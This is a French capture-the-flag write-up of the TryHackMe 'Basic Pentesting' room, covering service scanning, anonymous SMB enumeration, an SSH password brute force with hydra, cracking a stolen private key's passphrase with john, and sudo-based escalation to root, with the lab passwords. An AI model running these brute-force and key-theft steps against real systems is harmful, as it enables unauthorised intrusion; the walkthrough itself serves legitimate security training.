---
tags:
  - plateforme/thm
  - os/linux
  - status/completed
difficulty: easy
ip: 10.10.10.25
url: https://tryhackme.com/room/basicpentestingjt
creation_date: 2025-10-27
completion_date: 2025-10-27
---
# Basic Pentesting - TryHackMe

## 📝 Description & Objectifs
Room d'introduction au pentesting couvrant :
- Énumération de services
- Exploitation SMB
- Cracking de hash
- Escalade de privilèges via SSH

---

## 🕵️‍♂️ Phase 1 : Énumération & Reconnaissance

### 🗺️ Scan Nmap
```bash
nmap -sV -sC -oN nmap_results.txt 10.10.10.25
```

**Résultats :**
- Port 22 (SSH) - OpenSSH 7.2p2
- Port 80 (HTTP) - Apache 2.4.18
- Port 139/445 (SMB) - Samba 4.3.11
- Port 8009 (AJP) - Apache Jserv
- Port 8080 (HTTP) - Apache Tomcat

### 🌐 Énumération Web
```bash
gobuster dir -u http://10.10.10.25 -w /usr/share/wordlists/dirb/common.txt
```

**Découvertes :**
- `/development` - Notes de développement exposées

### 📁 Énumération SMB
```bash
enum4linux -a 10.10.10.25
smbclient -L //10.10.10.25 -N
```

**Partages trouvés :**
- `Anonymous` - Accessible sans mot de passe
- Fichiers : `staff.txt` (liste d'utilisateurs)

---

## 💥 Phase 2 : Exploitation

**Vecteur d'attaque :** [[SMB Anonymous Access]] + [[SSH Bruteforce]]

### Étape 1 : Récupération d'informations
```bash
smbclient //10.10.10.25/Anonymous -N
get staff.txt
```

**Utilisateurs identifiés :**
- jan
- kay

### Étape 2 : Bruteforce SSH
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.25
```

**Résultat :** Mot de passe trouvé : `armando`

### Étape 3 : Connexion SSH
```bash
ssh jan@10.10.10.25
# Password: armando
```

✅ **Accès utilisateur obtenu**

---

## 🚀 Phase 3 : Élévation de Privilèges

### Énumération Post-Exploitation
```bash
id
sudo -l
find / -perm -4000 2>/dev/null
ls -la /home
```

**Découverte :** Clé SSH privée de kay dans `/home/kay/.ssh/id_rsa`

### Exploitation
```bash
# Copie de la clé privée
cat /home/kay/.ssh/id_rsa
# Sauvegarde locale
chmod 600 kay_id_rsa

# La clé est protégée par passphrase
ssh2john kay_id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Passphrase trouvée :** `beeswax`

```bash
ssh -i kay_id_rsa kay@10.10.10.25
# Passphrase: beeswax

# Vérification des privilèges
sudo -l
# kay peut exécuter /usr/bin/pass en tant que root

# Exploitation
sudo /usr/bin/pass
```

✅ **Root obtenu**

---

## 💡 Takeaways & Commandes Utiles

**Leçons apprises :**
1. Toujours énumérer SMB - les partages anonymes contiennent souvent des infos sensibles
2. Les clés SSH peuvent être crackées avec `ssh2john` + `john`
3. Vérifier les permissions sur les fichiers des autres utilisateurs

**Commandes clés :**
```bash
# Énumération SMB complète
enum4linux -a <IP>
smbclient -L //<IP> -N

# Crack de clé SSH
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt

# Énumération post-exploit
find / -perm -4000 2>/dev/null  # SUID
getcap -r / 2>/dev/null          # Capabilities
```

**Outils utilisés :**
- [[Nmap]]
- [[Gobuster]]
- [[enum4linux]]
- [[Hydra]]
- [[John the Ripper]]

**Vulnérabilités rencontrées :**
- [[SMB Anonymous Access]]
- [[Weak SSH Credentials]]
- [[Sudo Misconfiguration]]
